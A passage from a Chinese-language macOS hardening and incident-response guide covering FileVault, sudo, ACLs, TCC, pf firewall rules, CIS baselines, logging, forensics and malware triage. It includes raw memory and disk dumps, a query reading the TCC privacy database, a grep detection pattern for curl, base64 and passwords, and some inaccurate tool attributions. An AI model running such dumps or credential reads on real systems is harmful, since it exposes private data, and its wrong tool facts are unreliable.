  │  └─ 硬件密钥（T2/Secure Enclave）       │
  │      包装 VMK，绑定硬件                  │
  └─────────────────────────────────────────┘

加密流程：
  1. 用户密码 → PBKDF2 派生 → 密钥包装密钥
  2. 密钥包装密钥 → 解密 → 卷主密钥（VMK）
  3. VMK → 解密 → 数据加密密钥（DEK）
  4. DEK + XTS 模式 → 实时加解密磁盘扇区
  5. 硬件密钥绑定 → 仅在原硬件上可解密 VMK
```

**FileVault 状态管理**

```bash
# 查看 FileVault 状态
fdesetup status
# 输出：FileVault is On.（或 Off.）

# 查看已授权解锁用户
fdesetup list

# 启用 FileVault
sudo fdesetup enable
# 此命令会生成恢复密钥并开始加密

# 禁用 FileVault（解密过程，耗时较长）
sudo fdesetup disable

# 添加解锁用户
sudo fdesetup add -usertoadd username

# 导出恢复密钥信息
sudo fdesetup changerecovery -personal
```

### 6.2 恢复密钥管理

**恢复密钥类型**

| 类型 | 说明 | 适用场景 |
|------|------|----------|
| 个人恢复密钥 | 由系统生成，用户保管 | 个人用户 |
| 机构恢复密钥 | 由 MDM 管理员生成和托管 | 企业环境 |
| iCloud 恢复 | 存储在 iCloud 钥匙串 | 个人用户（可选） |

**企业环境恢复密钥管理**

```bash
# MDM 下启用 FileVault 并托管机构密钥
# 通过 Configuration Profile 部署：
# PayloadType: com.apple.security.FDE
# PayloadContent:
#   ShowRecoveryKey: true  ← 显示恢复密钥给用户
#   RecoveryKeyEscrow:
#     URL: https://mdm.example.com/escrow  ← 托管地址
#   DestroyFVKeyOnStandby: true  ← 待机时销毁密钥

# 使用 fdesetup 在 MDM 环境中生成密钥文件
sudo fdesetup enable -outputplist /tmp/fv_key.plist
# 输出文件包含恢复密钥和加密信息
```

### 6.3 FileVault 与硬件安全

**T2 芯片 / Secure Enclave 的作用**

```
Apple T2 / M系列芯片安全架构：
┌──────────────────────────────────────┐
│  Secure Enclave（安全隔区）           │
│  ├─ 硬件密钥存储（不可导出）          │
│  ├─ UID（设备唯一标识符）             │
│  └─ 密钥派生与包装                    │
├──────────────────────────────────────┤
│  启动安全性                           │
│  ├─ Secure Boot Chain                 │
│  ├─ Kernel Integrity                  │
│  └─ 签名系统卷（SSV）                 │
├──────────────────────────────────────┤
│  FileVault 集成                      │
│  ├─ 硬件绑定（VMK 绑定到芯片）         │
│  ├─ 密钥不可提取                      │
│  └─ 离机解锁需要恢复密钥              │
├──────────────────────────────────────┤
│  Touch ID / 指纹                      │
│  └─ 指纹验证解锁 FileVault            │
└──────────────────────────────────────┘
```

### 6.4 磁盘加密攻击与防御

| 攻击方式 | 原理 | 防御建议 |
|----------|------|----------|
| 冷启动攻击 | 从内存中提取密钥 | 设置短超时锁屏，启用 DestroyFVKeyOnStandby |
| 恶意 DMA | 通过 Thunderbolt/USB-C 进行 DMA 内存读取 | 禁用未授权的 Thunderbolt 设备，启用内核扩展限制 |
| 密码暴力破解 | 离线破解用户密码 | 设置强密码，增加 PBKDF2 迭代次数 |
| 恢复密钥泄露 | 恢复密钥保管不当 | 使用 MDM 托管，密钥加密存储 |
| 固件攻击 | 修改 EFI/ROM | Secure Boot 验证固件完整性 |
| 物理提取 | 拆硬盘到其他机器读取 | 硬件绑定（T2/M 芯片），不可离机解密 |

```bash
# 配置安全超时（锁屏后销毁 FileVault 密钥）
sudo fdesetup changesetting -DestroyFVKeyOnStandby true

# 配置系统待机延迟（减少密钥在内存中的时间）
sudo pmset -a standbydelayhigh 900   # 高电量待机延迟 15 分钟
sudo pmset -a standbydelaylow 300    # 低电量待机延迟 5 分钟
```

---

## 七、macOS 权限与访问控制

### 7.1 用户权限模型

macOS 用户权限模型基于 POSIX，但加入了额外的安全层。

| 用户类型 | UID | 权限 | 说明 |
|----------|-----|------|------|
| root | 0 | 完全控制 | 受 SIP 限制，不直接登录 |
| admin | 501+ | 管理权限 | 可使用 sudo，可安装软件 |
| standard | 501+ | 普通权限 | 无 sudo，无系统修改权限 |
| 系统服务 | 1-500 | 各服务最小权限 | launchd 管理的系统服务用户 |

```bash
# 查看当前用户信息
id
# 输出：uid=501(alice) gid=20(staff) groups=20(staff),12(everyone),...

# 查看管理员用户
dscl . -read /Groups/admin GroupMembership
# 输出：GroupMembership: alice bob

# 创建标准用户
sudo sysadminctl -addUser charlie -password - -adminUser alice

# 将用户提升为管理员
sudo dseditgroup -o edit -a charlie -t user admin

# 将管理员降级为标准用户
sudo dseditgroup -o edit -d charlie -t user admin
```

### 7.2 sudo 与授权管理

```bash
# macOS sudo 配置文件
/etc/sudoers

# 安全编辑 sudoers（使用 visudo）
sudo visudo

# sudoers 配置示例
# 允许 admin 组执行所有命令（默认）
%admin  ALL=(ALL) ALL

# 允许特定用户执行特定命令
operator ALL=(root) /usr/sbin/softwareupdate, /usr/bin/ditto

# 免密码执行特定命令（自动化脚本）
deploy ALL=(root) NOPASSWD: /usr/local/bin/deploy.sh

# 使用别名组织规则
User_Alias  DBADMIN = dbuser1, dbuser2
Cmnd_Alias  DB = /usr/local/bin/db_backup, /usr/local/bin/db_restore
DBADMIN     ALL=(root) NOPASSWD: DB

# 查看 sudo 权限
sudo -l
```

### 7.3 POSIX 权限与 ACL

macOS 支持 POSIX 权限和 NFSv4 ACL 两层访问控制。

```bash
# 查看文件权限（POSIX + ACL）
ls -le /path/to/file
# 输出示例：
# -rw-r--r--+ 1 alice staff 0 Sep 1 10:00 file.txt
#  0: group:staff allow read,write
#  1: user:bob allow read

# 修改 POSIX 权限
chmod 755 /path/to/file
chmod u+x,g-w,o-r /path/to/file

# 修改 ACL（使用 chmod 的 ACL 扩展语法）
chmod +a "bob allow read,write" /path/to/file
chmod +a "group:devteam allow read" /path/to/file

# 删除 ACL
chmod -a "bob allow read,write" /path/to/file
chmod -N /path/to/file    # 删除所有 ACL

# 递归设置目录 ACL
chmod -R +a "group:staff allow read,execute,search" /path/to/dir

# ACL 权限关键词
# read, write, delete, append, execute, search, readattr, writeattr,
# readextattr, writeextattr, readsecurity, writesecurity, chown
```

### 7.4 TCC 数据库与隐私权限管理

```bash
# 重置单个应用的 TCC 权限（用户需要重新授权）
tccutil reset All com.example.app

# 重置所有应用的特定权限
tccutil reset Camera
tccutil reset Microphone
tccutil reset SystemPolicyAllFiles

# 通过 MDM 预配置 TCC 权限（Privacy Preferences Policy Control, PPPC）
# Configuration Profile 示例：
# PayloadType: com.apple.TCC.configuration-profile-policy
# PayloadContent:
#   Services:
#     SystemPolicyAllFiles:
#       Identifier: com.example.app
#       IdentifierType: bundleID
#       Allowed: true
#       CodeRequirement: identifier "com.example.app" and anchor apple...

# 监控 TCC 权限请求
log stream --predicate \
  'subsystem == "com.apple.TCC"' --info --debug
```

---

## 八、macOS 网络安全

### 8.1 防火墙（Application Firewall, ALF）

ALF（Application Layer Firewall）是 macOS 内置的应用层防火墙，按应用而非端口控制网络访问。

```bash
# 查看 ALF 状态
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
# 输出：Firewall Function Enabled.（或 Disabled.）

# 启用/禁用 ALF
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off

# 设置允许入站连接的应用
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add /path/to/app
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp /path/to/app

# 查看应用列表
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --listapps

# 启用隐身模式（不响应 ping 和端口扫描）
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setstealthmode on

# 查看隐身模式状态
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getstealthmode

# 配置日志
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setloggingmode on
sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setloggingopt detail
```

### 8.2 pfctl 包过滤防火墙配置

macOS 内置 OpenBSD 的 PF（Packet Filter）防火墙，提供更细粒度的网络层过滤。

```bash
# pf 配置文件位置
/etc/pf.conf          # 主配置文件
/pf.anchors/          # 锚点规则文件目录

# 查看 pf 状态
sudo pfctl -s info

# 启用/禁用 pf
sudo pfctl -e         # 启用
sudo pfctl -d         # 禁用

# 重新加载规则
sudo pfctl -f /etc/pf.conf

# 查看当前规则
sudo pfctl -s rules

# pf.conf 示例配置

# 宏定义
ext_if = "en0"
web_ports = "{ http, https }"

# 选项
set block-policy drop
set fingerprints "/etc/pf.os"
set state-defaults pflow

# 规范化（清理异常数据包）
scrub in all

# 默认阻止所有入站
block in all

# 允许回环
pass in quick on lo0 all
pass out quick on lo0 all

# 阻止特定国家 IP（示例，需 GeoIP 数据库）
# block in quick from { 10.0.0.0/8, 172.16.0.0/12 } to any

# 允许出站
pass out all keep state

# 允许特定入站
pass in on $ext_if proto tcp from any to any port $web_ports keep state

# 防 SYN Flood
pass in on $ext_if proto tcp to any port $web_ports flags S/SA keep state \
    (max 100, source-track rule, max-src-conn 50, max-src-nodes 50, \
     max-src-conn-rate 10/30, overload flush)
```

### 8.3 VPN 配置与安全

```bash
# 查看网络服务
networksetup -listallnetworkservices

# 配置 L2TP/IPSec VPN（系统偏好设置 GUI 或 networksetup）
sudo networksetup -createl2tpservice "Company VPN" \
    --server vpn.example.com \
    --account username

# 配置 IKEv2 VPN
# 推荐使用 MDM 部署 VPN 配置 Profile
# PayloadType: com.apple.vpn.managed
# PayloadContent:
#   IPv4:
#     Proxies: ...
#   ProxiesType: ...
#   VPNType: IKEv2
#   OnDemand: ...
#   IKEv2:
#     AuthenticationMethod: Certificate
#     ServerCertificateCommonName: vpn.example.com

# 检查 VPN 路由
netstat -rn | grep utun

# Split Tunneling 安全注意：
# 1. 避免 Split Tunneling 导致流量泄露
# 2. 确保所有流量走 VPN 或定义明确的路由
# 3. 监控 DNS 泄露（使用专用 DNS 服务器）
```

### 8.4 网络流量分析工具

```bash
# tcpdump — 命令行抓包
sudo tcpdump -i en0 -w /tmp/capture.pcap
sudo tcpdump -i en0 port 443 -nn -X
sudo tcpdump -i en0 'host malicious.example.com' -nn

# nettop — 实时网络监控
nettop -P -L 1 -x   # 按进程显示网络流量

# lsof — 查看网络连接
sudo lsof -i -P -n | grep LISTEN    # 监听端口
sudo lsof -i -P -n | grep ESTABLISHED  # 已建立连接

# networksetup — 网络配置
networksetup -listallhardwareports
networksetup -getdnsservers Wi-Fi
sudo networksetup -setdnsservers Wi-Fi 1.1.1.1 8.8.8.8

# arp — ARP 表
arp -a              # 查看所有 ARP 表项
arp -a -i en0       # 指定接口

# Wireshark — 图形化抓包分析（需单独安装）
# 安装：brew install --cask wireshark
# 使用专用接口监控模式抓包

# 识别异常 C2 通信
# 1. 周期性固定间隔连接到外部 IP
# 2. DNS 隧道（高频 TXT/A 查询）
# 3. 非标准端口 HTTPS 通信
# 4. DNS over HTTPS (DoH) 绕过本地 DNS 监控
```

---

## 九、macOS 安全加固

### 9.1 安全配置基线（CIS Benchmark for macOS）

CIS（Center for Internet Security）Benchmark 为 macOS 提供了详细的安全配置基线。

**关键 CIS 控制项**

| 控制编号 | 控制项 | 配置方法 |
|----------|--------|----------|
| 1.1 | 确保 FileVault 已启用 | `sudo fdesetup enable` |
| 2.1 | 确保 Gatekeeper 已启用 | `sudo spctl --master-enable` |
| 2.3 | 确保 SIP 已启用 | 恢复模式 `csrutil enable` |
| 3.1 | 确保防火墙已启用 | `socketfilterfw --setglobalstate on` |
| 3.4 | 启用隐身模式 | `socketfilterfw --setstealthmode on` |
| 4.1 | 禁用远程登录（SSH） | `sudo systemsetup -setremotelogin off` |
| 4.5 | 禁用自动登录 | `sudo defaults write /Library/Preferences/com.apple.loginwindow autoLoginUser -int 0` |
| 5.1 | 设置屏幕锁定延迟 | `defaults write com.apple.screensaver idle -int 300` |
| 5.3 | 禁用自动打开安全文件 | Safari 偏好设置中关闭 |
| 6.1 | 确保 sudo 超时设置 | `/etc/sudoers` 添加 `Defaults timestamp_timeout=5` |
| 6.2 | 确保密码策略 | 配置密码最小长度和复杂度 |
| 6.5 | 确保账户锁定 | 配置失败登录锁定 |
| 7.1 | 限制 AFP/SMB 共享 | 关闭不必要的文件共享服务 |
| 8.1 | 禁用蓝牙（未使用时） | `sudo defaults write /Library/Preferences/com.apple.Bluetooth ControllerPowerState -int 0` |

**自动化基线检查脚本**

```bash
#!/bin/bash
# macOS CIS 基线快速检查脚本

echo "=== macOS Security Baseline Check ==="
echo ""

echo "[1] FileVault Status:"
fdesetup status

echo "[2] Gatekeeper Status:"
spctl --status

echo "[3] SIP Status:"
csrutil status

echo "[4] Firewall Status:"
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate
/usr/libexec/ApplicationFirewall/socketfilterfw --getstealthmode

echo "[5] SSH Status:"
sudo systemsetup -getremotelogin

echo "[6] Auto-login Status:"
defaults read /Library/Preferences/com.apple.loginwindow autoLoginUser 2>/dev/null \
  && echo "WARNING: Auto-login ENABLED" || echo "Auto-login DISABLED"

echo "[7] Screen Lock Idle Time:"
defaults read com.apple.screensaver idle 2>/dev/null || echo "Not set"

echo "[8] Sudo Timeout:"
grep timestamp_timeout /etc/sudoers 2>/dev/null || echo "Default (15min)"

echo "[9] Bluetooth Status:"
defaults read /Library/Preferences/com.apple.Bluetooth ControllerPowerState 2>/dev/null

echo "[10] Guest Account:"
sudo defaults read /Library/Preferences/com.apple.loginwindow GuestEnabled 2>/dev/null
```

### 9.2 企业级安全策略（MDM/Profile Manager/JAMF）

**MDM（Mobile Device Management）核心功能**

```
┌─────────────────────────────────────────────┐
│  MDM 服务器（JAMF Pro / Profile Manager）   │
├─────────────────────────────────────────────┤
│  ├─ 设备注册与策略分发                       │
│  ├─ 配置 Profile（Configuration Profiles）  │
│  ├─ 应用分发与更新                           │
│  ├─ 合规性监控                               │
│  ├─ 远程锁定/擦除                            │
│  └─ 安全报告                                 │
├─────────────────────────────────────────────┤
│  Configuration Profile 类型                  │
│  ├─ com.apple.security.FDE（FileVault）      │
│  ├─ com.apple.security.firewall              │
│  ├─ com.apple.security.GKApproval            │
│  ├─ com.apple.TCC.configuration-profile-policy │
│  ├─ com.apple.systempolicy.kernel-extension-policy │
│  ├─ com.apple.MCX（托管偏好）               │
│  ├─ com.apple.apsl（APN 推送）               │
│  ├─ com.apple.vpn.managed                    │
│  ├─ com.apple.passwordpolicy                 │
│  ├─ com.apple.security.smartcard             │
│  └─ com.apple.security.certificate...       │
└─────────────────────────────────────────────┘
```

**JAMF Pro 关键配置**

```bash
# JAMF Pro 策略示例（通过 API 或 GUI）

# 1. 强制 FileVault 加密
# Configuration Profile: com.apple.security.FDE
# - ShowRecoveryKey: true
# - RecoveryKeyEscrow: <MDM URL>
# - DestroyFVKeyOnStandby: true

# 2. 强制 Gatekeeper
# Configuration Profile: com.apple.security.GKApproval
# - GKApproval: 2 (App Store + Developer ID)

# 3. 限制系统偏好设置面板
# Configuration Profile: com.apple.systempreferences
# - DisabledPreferencePanes: [com.apple.preferences.sharing, ...]

# 4. 强制密码策略
# Configuration Profile: com.apple.passwordpolicy
# - minLength: 12
# - minComplexChars: 4
# - requireAlphanumeric: true
# - maxGracePeriod: 0
# - maxFailedAttempts: 5

# 检查 MDM 注册状态
sudo profiles status -type enrollment
sudo profiles list
sudo profiles show -type configuration
```

### 9.3 补丁管理与自动更新

```bash
# 查看系统版本
sw_vers
# 输出：
# ProductName:    macOS
# ProductVersion: 15.0
# BuildVersion:   24A335

# 检查可用更新
softwareupdate --list

# 安装所有更新
sudo softwareupdate --install --all

# 安装特定更新
sudo softwareupdate --install "macOS Sequoia 15.0.1-XXXXX"

# 仅安装推荐更新
sudo softwareupdate --install --recommended

# 配置自动检查更新
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate \
  AutomaticCheckEnabled -bool true

# 配置自动下载更新
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate \
  AutomaticDownload -int 1

# 配置自动安装系统数据更新
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate \
  ConfigDataInstall -int 1

# 配置自动安装安全更新
sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate \
  CriticalUpdateInstall -int 1

# 快速安全响应更新（macOS 13+ 的快速补丁）
# RSR (Rapid Security Response) 更新独立于主版本
softwareupdate --list-full-installers  # 列出完整安装器版本
```

### 9.4 审计日志与监控

macOS 10.12+ 使用统一日志系统（Unified Logging System, ULS），通过 `log` 命令访问。

```bash
# 查看实时日志流
sudo log stream --level info

# 按谓词过滤日志
sudo log stream --predicate 'process == "sudo"' --info

# 查看最近 1 小时认证日志
sudo log show --last 1h --predicate \
  'subsystem == "com.apple.Authorization"' --info

# 查看最近 24 小时安全相关日志
sudo log show --last 24h --predicate \
  'category == "security" OR processImagePath CONTAINS "securityd"' \
  --style compact

# 导出日志供分析
sudo log collect --output /tmp/system_logs.logarchive --last 24h

# 搜索特定关键字
sudo log show --last 7d --predicate \
  'eventMessage CONTAINS "failed authentication"' --info

# 查看登录历史
last | head -20

# 查看当前登录用户
w

# 审计进程启动记录
sudo log show --last 1h --predicate \
  'eventMessage CONTAINS "exec"' --info | grep -i "process"

# 关键安全监控谓词
# 1. 监控 sudo 使用
sudo log stream --predicate 'process == "sudo"'
# 2. 监控 SSH 连接
sudo log stream --predicate 'process == "sshd"'
# 3. 监控 TCC 变更
sudo log stream --predicate 'subsystem == "com.apple.TCC"'
# 4. 监控 LaunchAgent/Daemon 加载
sudo log stream --predicate 'process == "launchd"'
# 5. 监控网络连接
sudo log stream --predicate 'subsystem == "com.apple.network"'

# 配置日志持久化（默认是循环缓冲）
# /etc/asl/ 目录下配置持久化规则
# /Library/Logs/ 目录存放应用日志
```

---

## 十、macOS 取证与应急响应

### 10.1 统一日志系统（OSLog）使用

```bash
# 系统日志架构
# /var/log/         — 传统日志目录（部分旧系统）
# /var/db/diagnostics/ — 统一日志数据库（OSLog）
# log 命令通过 os_log API 访问

# 收集完整系统日志
sudo log collect --last 7d --output /tmp/forensic_logs.logarchive

# 分析日志存档
log show /tmp/forensic_logs.logarchive --predicate \
  'process == "screensharingd" OR process == "sshd"' --info

# 查看进程活动时间线
log show --last 24h --predicate \
  'eventMessage CONTAINS "launch"' --style compact | \
  awk '{print $0}' | sort

# 提取用户登录登出事件
log show --last 7d --predicate \
  'subsystem == "com.apple.Authorization" OR \
   subsystem == "com.apple.securityd" OR \
   process == "loginwindow"' --info

# 提取 USB 设备连接事件
log show --last 7d --predicate \
  'subsystem == "com.apple.usb"' --info
```

### 10.2 内存取证

```bash
# macOS 内存取证工具

# 1. recon-pcap — Apple 官方内存分析工具（需要开发者账户）
# 2. Volatility 3 — 开源内存取证框架（macOS 支持）

# 获取内存镜像（需要 SIP 禁用 + 特定驱动）
# Intel Mac 使用 /dev/mem（SIP 禁用后）
sudo dd if=/dev/mem of=/tmp/memory.dump bs=1m

# Apple Silicon Mac 使用 mac-memory 解决方案
# 需要通过 Apple Silicon 特定的内存获取工具

# Volatility 3 分析 macOS 内存
# 需要对应的 symbol tables
python3 vol.py -f memory.dump banners.Banners
python3 vol.py -f memory.dump pslist.PsList
python3 vol.py -f memory.dump netscan.NetScan
python3 vol.py -f memory.dump malfind.Malfind

# 关键取证内存对象
# - 进程列表（含隐藏进程）
# - 网络连接（含已断开的）
# - 加载的内核模块/KEXT
# - Mach 端口
# - 内存中的恶意代码
```

### 10.3 磁盘取证与分析

```bash
# 创建磁盘镜像（只读挂载）
sudo dd if=/dev/disk0 of=/tmp/disk_image.dd bs=1m conv=noerror,sync
sudo dd if=/dev/disk0 of=/tmp/disk_image.img bs=4m conv=sync,noerror status=progress

# 或使用 dd_rescue（更好的错误处理）
# 使用 hdiutil 创建 DMG 镜像
sudo hdiutil create -srcdevice /dev/disk0 /tmp/disk_image.dmg

# 挂载镜像（只读模式）
sudo hdiutil attach -readonly /tmp/disk_image.dmg

# 文件系统取证

# 1. 时间线分析
# 提取文件时间戳（MACB times: Modified, Accessed, Changed, Born）
find /Volumes/disk_image -type f -exec stat -f "%m %N" {} \; | sort -n > timeline.txt

# 2. 查找最近修改的文件
find / -type f -mtime -1 -ls 2>/dev/null | head -50

# 3. 查找可疑文件权限
find / -perm -4000 -type f 2>/dev/null    # SUID 文件
find / -perm -2000 -type f 2>/dev/null    # SGID 文件
find / -perm -o+w -type f 2>/dev/null     # 全局可写文件

# 4. 查找隐藏文件
find / -name ".*" -type f 2>/dev/null | grep -v "^\./\..*$"

# 5. 分析 LaunchAgents/Daemons（持久化）
ls -la ~/Library/LaunchAgents/
ls -la /Library/LaunchAgents/
ls -la /Library/LaunchDaemons/
ls -la /System/Library/LaunchAgents/
ls -la /System/Library/LaunchDaemons/

# 检查所有 LaunchAgent plist
for f in ~/Library/LaunchAgents/*.plist \
         /Library/LaunchAgents/*.plist \
         /Library/LaunchDaemons/*.plist; do
    echo "=== $f ==="
    defaults read "$f" 2>/dev/null
done

# 6. 检查登录项
osascript -e 'tell application "System Events" to get the name of every login item'

# 7. 检查 cron 任务
crontab -l
sudo crontab -l
ls -la /etc/cron.* 2>/dev/null
```

### 10.4 常见 macOS 恶意软件分析案例

| 恶意软件名称 | 首次出现 | 行为特征 | 持久化方式 |
|-------------|----------|----------|------------|
| Flashback | 2012 | 通过 Java 漏洞感染，劫持 DNS | LaunchAgent + Safari 注入 |
| Genieo/Pirrit | 2014 | 广告软件，修改浏览器主页和搜索 | LaunchAgent + Safari 扩展 |
| KeRanger | 2016 | 首个 macOS 勒索软件，加密用户文件 | Transmission BT 客户端感染 |
| Fruitfly | 2017 | 间谍软件，远程控制摄像头和键盘 | LaunchAgent + 启动项 |
| Shlayer | 2018 | 通过伪造 Adobe Flash 更新传播 | LaunchAgent + 浏览器配置文件修改 |
| XCSSET | 2020 | 感染 Xcode 项目，窃取 Safari Cookie | Xcode 项目植入 + LaunchAgent |
| Silver Sparrow | 2021 | M1 芯片原生恶意软件，行为待定 | LaunchAgent（~/.manifest） |
| XLoader | 2021 | 信息窃取，macOS/Windows 跨平台 | 伪装合法应用 + LaunchAgent |
| CloudMensis | 2022 | 后门，通过 Cloud 存储中转 C2 | LaunchAgent |
| Realst | 2023 | 通过伪造会议软件窃取密码和加密钱包 | 伪装 Zoom/Teams 安装包 |
| Banshee Stealer | 2024 | 信息窃取，可绕过沙箱和 TCC 部分保护 | 伪装合法应用 |

**恶意软件分析流程**

```bash
# 1. 初始静态分析
# 查看文件类型
file /path/to/suspicious_binary

# 查看代码签名
codesign -dv --verbose=4 /path/to/suspicious_binary

# 查看 entitlements
codesign -d --entitlements - /path/to/suspicious_binary

# 查看 quarantine 属性
xattr -l /path/to/suspicious_binary

# 提取字符串
strings /path/to/suspicious_binary | grep -i "http\|url\|password\|key\|curl\|base64"

# 查看 Mach-O 头部
otool -hv /path/to/suspicious_binary
otool -L /path/to/suspicious_binary   # 动态库依赖

# 2. 行为分析（沙箱环境）
# 监控文件系统操作
sudo fs_usage -f filesys /path/to/suspicious_binary

# 监控网络连接
sudo lsof -i -r 1 | grep suspicious_binary

# 监控进程操作
sudo log stream --predicate \
  'processImagePath CONTAINS "suspicious_binary"' --info --debug

# 3. 动态分析（调试器）
# 使用 lldb 附加
lldb /path/to/suspicious_binary
(lldb) breakpoint set --name main
(lldb) run
(lldb) image list   # 加载的库
(lldb) register read
```

### 10.5 应急响应工具清单

| 工具 | 用途 | 安装方式 |
|------|------|----------|
| log | 统一日志查询 | 系统内置 |
| fs_usage | 文件系统活动监控 | 系统内置（需 root） |
| lsof | 打开文件/网络连接查看 | 系统内置 |
| netstat/nettop | 网络连接监控 | 系统内置 |
| ps/pstree | 进程树查看 | 系统内置 |
| launchctl | LaunchAgent/Daemon 管理 | 系统内置 |
| codesign | 代码签名验证 | 系统内置 |
| spctl | Gatekeeper 状态 | 系统内置 |
| csrutil | SIP 状态 | 系统内置 |
| fdesetup | FileVault 管理 | 系统内置 |
| tccutil | TCC 权限管理 | 系统内置 |
| profiles | MDM Profile 管理 | 系统内置 |
| sqlite3 | TCC.db 查询 | 系统内置 |
| KnockKnock | 持久化项扫描 | `brew install knockknock` |
| TaskExplorer | 进程管理（SleuthKit） | 官方下载 |
| LuLu | 开源 macOS 防火墙 | `brew install --cask lulu` |
| Suspicious Package | PKG 安装包分析 | 官方下载 |
| ImHex | 十六进制分析 | `brew install --cask imhex` |
| Volatility 3 | 内存取证 | Python pip |
| Autopsy | 磁盘取证 | 官方下载 |

**应急响应快速脚本**

```bash
#!/bin/bash
# macOS IR 快速信息收集脚本

IR_DIR="/tmp/ir_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$IR_DIR"

echo "=== System Info ==="
sw_vers > "$IR_DIR/system_info.txt"
system_profiler SPHardwareDataType >> "$IR_DIR/system_info.txt"

echo "=== Running Processes ==="
ps aux > "$IR_DIR/processes.txt"

echo "=== Network Connections ==="
sudo lsof -i -P -n > "$IR_DIR/network_connections.txt"
netstat -an >> "$IR_DIR/network_connections.txt"

echo "=== LaunchAgents/Daemons ==="
ls -la ~/Library/LaunchAgents/ > "$IR_DIR/launchagents.txt" 2>&1
ls -la /Library/LaunchAgents/ >> "$IR_DIR/launchagents.txt" 2>&1
ls -la /Library/LaunchDaemons/ >> "$IR_DIR/launchagents.txt" 2>&1

echo "=== Login Items ==="
osascript -e 'tell application "System Events" to get the name of every login item' \
  > "$IR_DIR/login_items.txt" 2>&1

echo "=== TCC Database ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, service, auth_value FROM access;" \
  > "$IR_DIR/tcc_database.txt" 2>&1

echo "=== Crontab ==="
crontab -l > "$IR_DIR/crontab.txt" 2>&1
sudo crontab -l >> "$IR_DIR/crontab.txt" 2>&1

echo "=== Code Signatures ==="
for app in /Applications/*.app; do
    codesign -dv --verbose=2 "$app" >> "$IR_DIR/code_signatures.txt" 2>&1
done

echo "=== FileVault Status ==="
fdesetup status > "$IR_DIR/filevault.txt" 2>&1

echo "=== Security Settings ==="
spctl --status > "$IR_DIR/security_settings.txt" 2>&1
csrutil status >> "$IR_DIR/security_settings.txt" 2>&1
fdesetup status >> "$IR_DIR/security_settings.txt" 2>&1

echo "=== Recent Logs ==="
sudo log show --last 1h --predicate \
  'process == "sudo" OR process == "sshd" OR process == "screensharingd"' \
  --info > "$IR_DIR/recent_logs.txt" 2>&1

echo "=== Last Logins ==="
last > "$IR_DIR/login_history.txt" 2>&1

echo "IR data collected at: $IR_DIR"
```

---

## 十一、macOS vs Windows 安全对比

### 11.1 安全模型对比

| 维度 | macOS | Windows |
|------|-------|---------|
| **权限提升** | sudo（需管理员密码） | UAC（需用户确认） |
| **系统保护** | SIP（rootless） | TrustedInstaller + PatchGuard |
| **代码执行控制** | Gatekeeper + Notarization（强制公证） | SmartScreen + AppLocker（可选） |
| **沙箱** | App Sandbox（seatbelt） | AppContainer + WDAG |
| **隐私控制** | TCC（统一权限管理） | 隐私设置（逐应用控制） |
| **磁盘加密** | FileVault 2（XTS-AES-128） | BitLocker（XTS-AES-128/256） |
| **恶意软件防护** | XProtect + MRT（特征匹配） | Windows Defender（行为+ML+云） |
| **签名验证** | 代码签名 + 公证（Apple 信任链） | Authenticode（CA 信任链） |
| **启动安全** | Secure Boot + SSV | Secure Boot + Measured Boot |
| **内核保护** | KASLR + Kext 验证 | KASLR + PatchGuard + DSE |

### 11.2 威胁场景对比

| 威胁 | macOS 典型场景 | Windows 典型场景 |
|------|----------------|------------------|
| **恶意软件感染** | 伪装合法应用、伪造更新（Shlayer） | 宏文档、漏洞利用工具包、PE 感染 |
| **持久化** | LaunchAgent/Daemon、登录项 | Run 键、计划任务、服务、WMI |
| **提权** | 利用 SIP 漏洞、sudo 配置缺陷 | UAC 绕过、内核漏洞、令牌窃取 |
| **横向移动** | SSH、屏幕共享、AppleScript | SMB/RDP/WMI/PsExec |
| **数据外泄** | iCloud 同步、AirDrop | SMB 传输、云同步 |
| **网络钓鱼** | 伪造登录页面窃取 Apple ID | 伪造登录页面窃取 AD 凭据 |
| **供应链攻击** | Xcode 项目植入（XCSSET） | DLL 劫持、MSI 包篡改 |

### 11.3 企业管理对比

| 维度 | macOS | Windows |
|------|-------|---------|
| **管理协议** | MDM（APN 推送） | GPO（LDAP/SMB）、MDM（Intune） |
| **管理工具** | JAMF Pro、Profile Manager、Mosyle | GPO、SCCM、Intune、PDQ Deploy |
| **配置分发** | Configuration Profile（.mobileconfig） | Group Policy（.admx）、MSI |
| **合规审计** | JAMF Compliance Reporter、CIS Benchmark | GPO Audit、CIS Benchmark、Nessus |
| **补丁管理** | softwareupdate、JAMF Patch Management | WSUS、SCCM、Intune Update |
| **设备注册** | DEP（Device Enrollment Program） | Autopilot、DEP |
| **身份认证** | Apple ID、企业 Kerberos、SmartCard | Active Directory、Azure AD、SmartCard |
| **应用分发** | VPP（Volume Purchase Program）、Self Service | SCCM、Microsoft Store for Business |

### 11.4 综合安全建议

```
macOS 企业安全最佳实践总结：

第一层：硬件与启动安全
├─ 启用 Secure Boot（Full Security）
├─ 启用 FileVault 2 全盘加密
├─ 托管恢复密钥到 MDM
└─ 配合 T2/Secure Enclave 硬件绑定

第二层：系统安全机制
├─ 启用 SIP（默认开启，禁止禁用）
├─ 启用 Gatekeeper（仅允许 App Store + Developer ID）
├─ 启用 Notarization 验证
├─ 保持 XProtect/MRT 自动更新
└─ 启用 ALF 防火墙 + 隐身模式

第三层：访问控制
├─ 标准用户日常使用（非 admin）
├─ 配置 sudo 超时和命令限制
├─ TCC 权限最小化
├─ 禁用不必要的共享服务（SSH/AFP/SMB）
└─ 配置密码策略和账户锁定

第四层：企业管控
├─ MDM 注册和策略分发
├─ CIS Benchmark 基线合规
├─ 自动补丁管理
├─ 部署 EDR 解决方案
└─ 统一日志收集与 SIEM 集成

第五层：应急准备
